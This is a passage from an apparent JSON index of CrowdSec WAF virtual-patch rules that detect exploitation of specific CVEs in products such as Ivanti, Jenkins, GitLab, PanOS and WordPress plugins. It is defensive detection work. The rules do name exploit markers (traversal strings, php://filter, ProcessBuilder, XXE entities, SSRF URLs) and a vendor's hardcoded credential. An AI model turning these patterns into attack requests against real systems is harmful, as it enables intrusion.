cve.CVE-2024-21887\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-287\n   - cwe.CWE-77\n", "description": "Ivanti Connect Auth Bypass (CVE-2023-46805)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-46805.yaml", "version": "0.4", "versions": {"0.1": {"digest": "d73f6475914ef2c68df3a55c7e38944ab514d0f602246ebb7aa703cf99f922d7"}, "0.2": {"digest": "bea99668edb018be9ddd78dae7ac1f9585ea8401d15d10494302901f30831bd8"}, "0.3": {"digest": "94039ee1d01b3cb7a66c6fd7e500ecdf0038de5b64242d48c0710e363baa8c7c"}, "0.4": {"digest": "d600d0e2e53c296169a060c4d07b2ce4b1ae9a17e181c90bcd44231bd6c7e89b"}}}, "crowdsecurity/vpatch-CVE-2023-47218": {"content": "name: crowdsecurity/vpatch-CVE-2023-47218\ndescription: \"QNAP QTS - RCE (CVE-2023-47218)\"\nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: equals\n          value: POST\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: endsWith\n          value: /cgi-bin/quick/quick.cgi\n      - zones:\n          - ARGS\n        variables:\n          - func\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: \"switch_os\"\n      - zones:\n          - ARGS\n        variables:\n          - todo\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: \"uploaf_firmware_image\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"QNAP QTS - RCE\"\n  classification:\n    - cve.CVE-2023-47218\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-78\n    - cwe.CWE-77\n", "description": "QNAP QTS - RCE (CVE-2023-47218)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-47218.yaml", "version": "0.2", "versions": {"0.1": {"digest": "8f0e7ba65f3701e9ea6804ddf23cbd5bc89fe63724424a0cc3d086244465d786"}, "0.2": {"digest": "c7d82e16459348e4f85e1a74e88d63afeca931eedfbc2a09f3311f7b9b58b1bb"}}}, "crowdsecurity/vpatch-CVE-2023-49070": {"content": "name: crowdsecurity/vpatch-CVE-2023-49070\ndescription: \"Apache OFBiz - RCE (CVE-2023-49070)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /webtools/control/xmlrpc;/\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - ARGS_NAMES\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"username\"\n    - zones:\n      - ARGS_NAMES\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"password\"\n    - zones:\n      - ARGS_NAMES\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"requirepasswordchange\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Apache OFBiz - RCE\"\n  classification:\n   - cve.CVE-2023-49070\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-94\n\n\n", "description": "Apache OFBiz - RCE (CVE-2023-49070)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-49070.yaml", "version": "0.1", "versions": {"0.1": {"digest": "8e97f76d9d5d07270acabdee9ffa0f4aed6632732efc188631f819e60342bd8b"}}}, "crowdsecurity/vpatch-CVE-2023-50164": {"content": "name: crowdsecurity/vpatch-CVE-2023-50164\ndescription: \"Apache Struts2 Path Traversal (CVE-2023-50164)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - BODY_ARGS\n#it might be used both in POST and GET args: https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)\n      - ARGS\n      variables:\n      - /.+filename$/\n      match:\n        type: contains\n        value: \"../\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Apache Struts2 Path Traversal\"\n  classification:\n   - cve.CVE-2023-50164\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-552\n\n\n", "description": "Apache Struts2 Path Traversal (CVE-2023-50164)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-50164.yaml", "version": "0.6", "versions": {"0.1": {"digest": "2af3917de29ccf7f71d43b78502602568b2d4582769e62ffb9c195fcfab33e90"}, "0.2": {"digest": "05c4eb4526d99bc0c9cbefbcc60e2fde6f93f5b0f41ea500565f791ae57ed67e"}, "0.3": {"digest": "fb7280f1aa638812e942985a0a061bc94bac1a5381e57eb764f447d72a8f09d0"}, "0.4": {"digest": "139eed3def5189d40e3f5e7d613c17ea40141c5707c0094735a41f03d609fc32"}, "0.5": {"digest": "776bff2e741b150b2fee625b9373f467085d4d52518b80e3712f3da3124c14ef"}, "0.6": {"digest": "8061064724ee0d544abcff0c661ec8a7ea2b1d1b505a67688754843df7b395a1"}}}, "crowdsecurity/vpatch-CVE-2023-6000": {"content": "## autogenerated on 2025-09-24 14:14:58\nname: crowdsecurity/vpatch-CVE-2023-6000\ndescription: 'Detects unauthenticated stored XSS in WordPress Popup Builder plugin via sgpb-WillOpen parameter.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /\n      - zones:\n          - BODY_ARGS\n        variables:\n          - sgpb-willopen\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: \"<\"\n      - zones:\n          - BODY_ARGS\n        variables:\n          - sgpb-is-preview\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: \"1\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'WordPress Popup Builder - XSS'\n  classification:\n    - cve.CVE-2023-6000\n    - attack.T1059\n    - cwe.CWE-79\n", "description": "Detects unauthenticated stored XSS in WordPress Popup Builder plugin via sgpb-WillOpen parameter.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-6000.yaml", "version": "0.1", "versions": {"0.1": {"digest": "0cef1dba267556a25293b23a97bce676e3f4fbe7b65435988ca4504c8b637891"}}}, "crowdsecurity/vpatch-CVE-2023-6360": {"content": "name: crowdsecurity/vpatch-CVE-2023-6360\ndescription: \"WordPress My Calendar - SQL Injection (CVE-2023-6360)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - ARGS\n      variables:\n      - rest_route\n      match:\n        type: contains\n        value: my-calendar/v1/events\n    - zones:\n      - ARGS\n      variables:\n      - from\n      match:\n        type: libinjectionSQL\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WordPress My Calendar - SQL Injection\"\n  references:\n    - https://medium.com/tenable-techblog/wordpress-mycalendar-plugin-unauthenticated-sql-injection-cve-2023-6360-d272887ddf12\n  classification:\n   - cve.CVE-2023-6360\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "WordPress My Calendar - SQL Injection (CVE-2023-6360)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-6360.yaml", "version": "0.1", "versions": {"0.1": {"digest": "37b2ec6ab08a337683f9284ac657e5b8d0c2f20a9674ef99c8616733b68e91df"}}}, "crowdsecurity/vpatch-CVE-2023-6553": {"content": "name: crowdsecurity/vpatch-CVE-2023-6553\ndescription: \"Backup Migration plugin for WordPress RCE (CVE-2023-6553)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /wp-content/plugins/backup-backup/includes/backup-heart.php\n    - zones:\n      - HEADERS\n      variables:\n      - content-dir\n      match:\n        type: startsWith\n        value: \"php://filter\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Backup Migration plugin for WordPress RCE\"\n  classification:\n   - cve.CVE-2023-6553\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-287", "description": "Backup Migration plugin for WordPress RCE (CVE-2023-6553)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-6553.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7f1b24ef1f47484198636bb3c21580d075befe0be4a5438c2fb881d7a8646827"}}}, "crowdsecurity/vpatch-CVE-2023-6567": {"content": "name: crowdsecurity/vpatch-CVE-2023-6567\ndescription: \"LearnPress - SQL Injection (CVE-2023-6567)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /wp-json/lp/v1/courses/archive-course\n    - zones:\n      - ARGS\n      transform:\n      - lowercase\n      variables:\n      - order_by\n      match:\n        type: libinjectionSQL\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"LearnPress - SQL Injection\"\n  classification:\n   - cve.CVE-2023-6567\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "LearnPress - SQL Injection (CVE-2023-6567)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-6567.yaml", "version": "0.1", "versions": {"0.1": {"digest": "011a1dbde137aeec7c80e5f2ef0266fbc8399d19d3d3b0e95a6f903712b848f9"}}}, "crowdsecurity/vpatch-CVE-2023-6623": {"content": "name: crowdsecurity/vpatch-CVE-2023-6623\ndescription: \"Wordpress Essential Blocks plugin LFI (CVE-2023-6623)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: /index.php\n    - zones:\n      - ARGS\n      variables:\n       - rest_route\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: essential-blocks\n    - zones:\n      - ARGS\n      variables:\n       - attributes\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: \"__file\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Wordpress Essential Blocks plugin LFI\"\n  classification:\n   - cve.CVE-2023-6623\n   - attack.T1211\n   - attack.T1190\n   - cwe.CWE-22", "description": "Wordpress Essential Blocks plugin LFI (CVE-2023-6623)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-6623.yaml", "version": "0.2", "versions": {"0.1": {"digest": "193eab047b8db102eea442e9b7013f3d989d3b909c1e5f7ad43635722defed9c"}, "0.2": {"digest": "618814ae8a7084954b2df8fb5349e68dcd9c937a1009f77b247ec631f2d852cb"}}}, "crowdsecurity/vpatch-CVE-2023-7028": {"content": "\nname: crowdsecurity/vpatch-CVE-2023-7028\ndescription: \"Gitlab Password Reset Account Takeover (CVE-2023-7028)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /users/password\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - BODY_ARGS\n      variables:\n      - 'user[email][]'\n      transform:\n      - count\n      match:\n        type: gte\n        value: 2\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Gitlab Password Reset Account Takeover\"\n  classification:\n   - cve.CVE-2023-7028\n   - attack.T1595\n   - attack.T1190", "description": "Gitlab Password Reset Account Takeover (CVE-2023-7028)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-7028.yaml", "version": "0.2", "versions": {"0.1": {"digest": "811a139492660287a20b85f93f48c4ae1de59ff4a22f8c73d7a7f5a56933d273"}, "0.2": {"digest": "e5171ce8e1da414ec9d165d6bfcd407eaad7f9f2b88531ce0651317dc4bbfa14"}}}, "crowdsecurity/vpatch-CVE-2024-0012": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-0012\ndescription: \"PanOS - Authentication Bypass (CVE-2024-0012)\"\nrules:\n  - and:\n    - zones:\n      - HEADERS\n      variables:\n       - x-pan-authcheck\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: off\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"PanOS - Authentication Bypass\"\n  classification:\n   - cve.CVE-2024-0012\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-306", "description": "PanOS - Authentication Bypass (CVE-2024-0012)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-0012.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7434c3ee5962dbda438656e79e150077e97f9da99e70303569515d3afabda145"}}}, "crowdsecurity/vpatch-CVE-2024-0204": {"content": "## autogenerated on 2025-09-25 09:36:59\nname: crowdsecurity/vpatch-CVE-2024-0204\ndescription: 'Detects authentication bypass in Fortra GoAnywhere MFT via path traversal to InitialAccountSetup.xhtml'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: '/goanywhere/images/..;'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'GoAnywhere MFT - Authentication Bypass'\n  classification:\n    - cve.CVE-2024-0204\n    - attack.T1190\n    - cwe.CWE-425\n", "description": "Detects authentication bypass in Fortra GoAnywhere MFT via path traversal to InitialAccountSetup.xhtml", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-0204.yaml", "version": "0.1", "versions": {"0.1": {"digest": "4a149d624ab384b106d7d17d5f54c140c7b3a835ae48560bad801c827c1bf996"}}}, "crowdsecurity/vpatch-CVE-2024-1061": {"content": "name: crowdsecurity/vpatch-CVE-2024-1061\ndescription: \"WordPress HTML5 Video Player - SQL Injection (CVE-2024-1061)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - ARGS\n      variables:\n      - rest_route\n      match:\n        type: contains\n        value: /h5vp/v1/view\n    - zones:\n      - ARGS\n      variables:\n      - id\n      match:\n        type: libinjectionSQL\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WordPress HTML5 Video Player - SQL Injection\"\n  classification:\n   - cve.CVE-2024-1061\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "WordPress HTML5 Video Player - SQL Injection (CVE-2024-1061)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-1061.yaml", "version": "0.1", "versions": {"0.1": {"digest": "289b3ce03463a12278dcaaf0a42b22fcc80a33e023849d0b4dbd5e590ae6e882"}}}, "crowdsecurity/vpatch-CVE-2024-1071": {"content": "name: crowdsecurity/vpatch-CVE-2024-1071\ndescription: \"WordPress Ultimate Member - SQL Injection (CVE-2024-1071)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /wp-admin/admin-ajax.php\n    - zones:\n      - ARGS\n      variables:\n      - action\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: um_get_members\n    - zones:\n      - BODY_ARGS\n      variables:\n      - sorting\n      match:\n        type: libinjectionSQL\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WordPress Ultimate Member - SQL Injection\"\n  classification:\n   - cve.CVE-2024-1071\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "WordPress Ultimate Member - SQL Injection (CVE-2024-1071)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-1071.yaml", "version": "0.2", "versions": {"0.1": {"digest": "3ced444bf784788cb77457328390c5a8af16278280b3cb7bbadc39dfbb51b9a1"}, "0.2": {"digest": "7af7662034b0a4e298e0fa698f60f89ac4cdb945b78b48d98d951ddf95851903"}}}, "crowdsecurity/vpatch-CVE-2024-1212": {"content": "name: crowdsecurity/vpatch-CVE-2024-1212\ndescription: \"Progress Kemp LoadMaster Unauthenticated Command Injection (CVE-2024-1212)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /access/set\n    - zones:\n      - HEADERS\n      variables:\n      - Authorization\n      match:\n        type: contains\n        value: 'Basic Jzt' #b64encode of ';\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"LoadMaster UCI\"\n  references:\n  - https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/\n  classification:\n   - cve.CVE-2024-1212\n   - attack.T1595\n   - attack.T1190\n", "description": "Progress Kemp LoadMaster Unauthenticated Command Injection (CVE-2024-1212)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-1212.yaml", "version": "0.3", "versions": {"0.1": {"digest": "3326d798f61d7c8958a55949f3867b13d88f86483eed381947596e8f4596f3ea"}, "0.2": {"digest": "0819184b4cda6c3ef48cf2fde19c4a5a9dde6a3389b0ad0c4a65df61de3247d0"}, "0.3": {"digest": "58256c07b3c6e43e42f125bb0b735b31ec621e17c3067ededc97b9fc5cc239a7"}}}, "crowdsecurity/vpatch-CVE-2024-22024": {"content": "name: crowdsecurity/vpatch-CVE-2024-22024\ndescription: \"Ivanti Connect Secure - XXE (CVE-2024-22024)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: \"/dana-na/auth/saml-sso.cgi\"\n    - zones:\n      - BODY_ARGS\n      transform:\n      - b64decode\n      variables:\n      - SAMLRequest\n      match:\n        type: contains\n        value: \"<!ENTITY\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Ivanti Connect Secure - XXE\"\n  classification:\n   - cve.CVE-2024-22024\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-611\n\n\n", "description": "Ivanti Connect Secure - XXE (CVE-2024-22024)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-22024.yaml", "version": "0.1", "versions": {"0.1": {"digest": "86d1e5651f9ed931064321629d37acd1d297f050af95304004743546ccde373b"}}}, "crowdsecurity/vpatch-CVE-2024-23897": {"content": "name: crowdsecurity/vpatch-CVE-2024-23897\ndescription: \"Jenkins CLI RCE (CVE-2024-23897)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      match:\n        type: endsWith\n        value: \"/cli\"\n    - zones:\n        - HEADERS\n      variables:\n        - side\n      transform:\n        - lowercase\n      match:\n        type: equals\n        value: \"upload\"\n    - zones:\n      - RAW_BODY\n      match:\n        type: regex\n        value: >-\n          @/|@\\.\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Jenkins CLI RCE\"\n  classification:\n   - cve.CVE-2024-23897\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-552\n\n\n", "description": "Jenkins CLI RCE (CVE-2024-23897)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-23897.yaml", "version": "0.4", "versions": {"0.1": {"digest": "ab1b0f8e512b1f4ec4a36928bc617a4cc047fd3040f5441072f4e8570a66839c"}, "0.2": {"digest": "adc0d879372de93098470b3058230c6a52fa3b7f35580ee55aa32f973a049982"}, "0.3": {"digest": "ab1b0f8e512b1f4ec4a36928bc617a4cc047fd3040f5441072f4e8570a66839c"}, "0.4": {"digest": "31e3cb46327f3b95ee097aca11e862c296e49602fa968077a85b2ba320cc97b6"}}}, "crowdsecurity/vpatch-CVE-2024-27198": {"content": "name: crowdsecurity/vpatch-CVE-2024-27198\ndescription: \"Teamcity - Authentication Bypass (CVE-2024-27198)\"\nrules:\n  - and:\n      - zones:\n          - URI_FULL\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \";.jsp\"\n      - zones:\n          - URI_FULL\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \"/app/rest/\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Teamcity - Authentication Bypass\"\n  classification:\n    - cve.CVE-2024-27198\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-94\n", "description": "Teamcity - Authentication Bypass (CVE-2024-27198)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-27198.yaml", "version": "0.5", "versions": {"0.1": {"digest": "1bd4f1a3645fc3a5ed7311cd2fdc535417963f0e8f9872a0fcdad2c6fe92b260"}, "0.2": {"digest": "18cc0e2d9cee1d2aef80d7ac4f2da92f1305dd5cd6468009840839f484321e5c"}, "0.3": {"digest": "6a74b6a71bce986adec58998aa99ba1332c54799b10535ad9966751e7348d4e9"}, "0.4": {"digest": "b8b51dea722e3c2e4d3a8349718e4642fc4746c02bb152a12e7aca185daf114e"}, "0.5": {"digest": "8b267345d9dedb9c76a884801651d4190eecd4df8fbd7b30f3bc38513d00ad5c"}}}, "crowdsecurity/vpatch-CVE-2024-27292": {"content": "## autogenerated on 2025-03-31 15:59:57\nname: crowdsecurity/vpatch-CVE-2024-27292\ndescription: 'Local File Inclusion - Docassemble'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /interview\n      - zones:\n          - ARGS\n        variables:\n          - i\n        transform:\n          - lowercase\n        match:\n          type: startsWith\n          value: /\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Docassemble - LFI'\n  classification:\n    - cve.CVE-2024-27292\n    - cwe.CWE-706\n    - attack.T1592\n", "description": "Local File Inclusion - Docassemble", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-27292.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6a9ce8f5e45bcb11570389fb28778581bf9311c78554dde5174621d95b41116a"}, "0.2": {"digest": "094145752cec069f2ce90e03c17320f42b10046c385454a66ca7b732c3d09718"}}}, "crowdsecurity/vpatch-CVE-2024-27348": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-27348\ndescription: \"Apache HugeGraph-Server - RCE (CVE-2024-27348)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /gremlin\n    - zones:\n      - BODY_ARGS\n      variables:\n      - json.gremlin\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: \"java.lang.processbuilder\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Apache HugeGraph-Server - RCE\"\n  classification:\n   - cve.CVE-2024-27348\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-77", "description": "Apache HugeGraph-Server - RCE (CVE-2024-27348)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-27348.yaml", "version": "0.1", "versions": {"0.1": {"digest": "46a0efc78b5b50d1e96cf5ab30c82c2cbafe0d9be13a8676889ae29056452ca2"}}}, "crowdsecurity/vpatch-CVE-2024-27564": {"content": "## autogenerated on 2025-03-28 15:39:45\nname: crowdsecurity/vpatch-CVE-2024-27564\ndescription: 'Detects SSRF attack via pictureproxy.php in ChatGPT application'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /pictureproxy.php\n      - zones:\n          - ARGS\n        variables:\n          - url\n        transform:\n          - lowercase\n        match:\n          type: regex\n          value: ^(http|https|file)://\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'ChatGPT - SSRF'\n  classification:\n    - cve.CVE-2024-27564\n    - attack.T1190\n    - cwe.CWE-918\n", "description": "Detects SSRF attack via pictureproxy.php in ChatGPT application", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-27564.yaml", "version": "0.3", "versions": {"0.1": {"digest": "ccf4a5cd6b78930991dc57dfbe8e38fb730d0819d21bdec8602ba85e4fdb790a"}, "0.2": {"digest": "457a5c4354e84f4a63ce898be6c272886f59ff4211498a3940937de4a062d7c4"}, "0.3": {"digest": "3e723184c352b9ead01ff15b4d6a35b34e27569c8fc649efa58355e4b67cb2b8"}}}, "crowdsecurity/vpatch-CVE-2024-27954": {"content": "name: crowdsecurity/vpatch-CVE-2024-27954\ndescription: \"WP Automatic - Path Traversal (CVE-2024-27954)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - ARGS\n      variables:\n       - wp_automatic\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"download\"\n    - zones:\n      - ARGS\n      variables:\n       - link\n      transform:\n      - lowercase\n      match:\n        type: startsWith\n        value: \"file://\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WP Automatic - Path Traversal\"\n  classification:\n   - cve.CVE-2024-27954\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22", "description": "WP Automatic - Path Traversal (CVE-2024-27954)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-27954.yaml", "version": "0.1", "versions": {"0.1": {"digest": "bf6471bd1c257cc27c60cb8474cdec8104571b5c0eb9a9a1880a3f15f6ae87b9"}}}, "crowdsecurity/vpatch-CVE-2024-27956": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-27956\ndescription: \"WordPress Automatic Plugin - SQLi (CVE-2024-27956)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /wp-content/plugins/wp-automatic/inc/csv.php\n    - zones:\n      - BODY_ARGS\n      variables:\n       - auth\n      match:\n        type: contains\n        value: \"\\x00\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WordPress Automatic Plugin - SQLi\"\n  classification:\n   - cve.CVE-2024-27956\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-502", "description": "WordPress Automatic Plugin - SQLi (CVE-2024-27956)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-27956.yaml", "version": "0.1", "versions": {"0.1": {"digest": "75f4bc972ce0fe46ffb311ee245a71bbeaf12963246dd98981b2d166f834191d"}}}, "crowdsecurity/vpatch-CVE-2024-28255": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-28255\ndescription: \"OpenMetadata - Authentication Bypass (CVE-2024-28255)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: /api/v1;v1/users/login/events/subscriptions/validation/condition\n    - zones:\n      - URI_FULL\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: \"java.lang.runtime\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"OpenMetadata - Authentication Bypass\"\n  classification:\n   - cve.CVE-2024-28255\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-94", "description": "OpenMetadata - Authentication Bypass (CVE-2024-28255)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-28255.yaml", "version": "0.1", "versions": {"0.1": {"digest": "a8dcb3b263333cd588e22e561d24c4c7b9da54c1a83fcc8da60b4ac5acfacaae"}}}, "crowdsecurity/vpatch-CVE-2024-28987": {"content": "\nname: crowdsecurity/vpatch-CVE-2024-28987\ndescription: \"SolarWinds WHD Hardcoded Credentials (CVE-2024-28987)\"\nrules:\n  - and:\n    - zones:\n      - HEADERS\n      variables:\n      - Authorization\n      transform:\n      - b64decode\n      - lowercase\n      match:\n        type: contains\n        value: \"helpdeskintegrationuser:dev-c4f8025e7\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"SolarWinds WHD Hardcoded Credentials\"\n  classification:\n   - cve.CVE-2024-28987\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-798", "description": "SolarWinds WHD Hardcoded Credentials (CVE-2024-28987)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2024-28987.yaml", "version": "0.1", "versions": {"0.1": {"digest": "9f357a599c62a2aaa03a9a16e2ea7e247b94e29c8cfa859869f0f39b52f6d17a"}}}, "crowdsecurity/vpatch-CVE-2024-29028": {"content": "## autogenerated on 2025-09-24 14:24:50\nname: crowdsecurity/vpatch-CVE-2024-29028\ndescription: 'Detects SSRF vulnerability in Memos API /o/get/httpmeta endpoint via url parameter.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /o/get/httpmeta\n      - zones:\n          - ARGS\n        variables:\n          - url\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: startsWith\n          value: http\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Memos - SSRF'\n  classification:\n    - cve.CVE-2024-29028\n    - attack.T1190\n    - cwe.CWE-918\n", "description": "Detects SSRF vulnerability in Memos API /o/get/httpmeta endpoint via url parameter.", "path": 